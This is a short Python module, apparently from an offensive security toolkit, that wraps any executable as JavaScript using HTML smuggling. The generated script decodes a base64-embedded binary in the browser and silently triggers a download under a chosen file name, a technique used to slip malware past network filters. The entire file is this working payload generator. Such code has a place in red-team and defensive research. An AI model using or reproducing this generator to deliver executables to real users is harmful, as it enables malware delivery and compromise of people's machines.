from lets.__module__ import Module
import base64


class JS(Module):
    """
    Wrap an executable file as JavaScript using HTML smuggling.
    """

    @classmethod
    def add_arguments(self, parser):
        parser.add_argument("-n", "--name", type=str, default="test.exe",
            help="name of the executable (%(default)s)")
        parser.add_argument("-t", "--type", type=str, default="application/octet-stream",
            help="mimetype of download (%(default)s)")

    def handle(self, input, name="test.exe", type="application/octet-stream"):
        assert input is not None, "Must provide executable as input"

        # Retrieve data
        for data in input:
            cmd  = "var f = '%s';" % base64.b64encode(data).decode()

            # Decode data
            cmd += "var s = window.atob(f);"
            cmd += "var l = s.length;"
            cmd += "var d = new Uint8Array(l);"
            cmd += "for (var i = 0; i < l; i++) { d[i] = s.charCodeAt(i); }"

            # Prepare and trigger download
            # (https://github.com/mholt/PapaParse/issues/175#issuecomment-75597039)
            cmd += "var b = new Blob([d]);"
            cmd += "if (window.navigator.msSaveOrOpenBlob) {"
            cmd += "window.navigator.msSaveBlob(b, '%s');" % name
            cmd += "} else {"
            cmd += "var a = window.document.createElement('a');"
            cmd += "document.body.appendChild(a);"
            cmd += "var u = window.URL.createObjectURL(b, {type: '%s'});" % type
            cmd += "a.href = u;"
            cmd += "a.download = '%s';" % name
            cmd += "a.click();"
            cmd += "document.body.removeChild(a);"
            cmd += "window.URL.revokeObjectURL(u);"
            cmd += "}"

            yield cmd.encode()
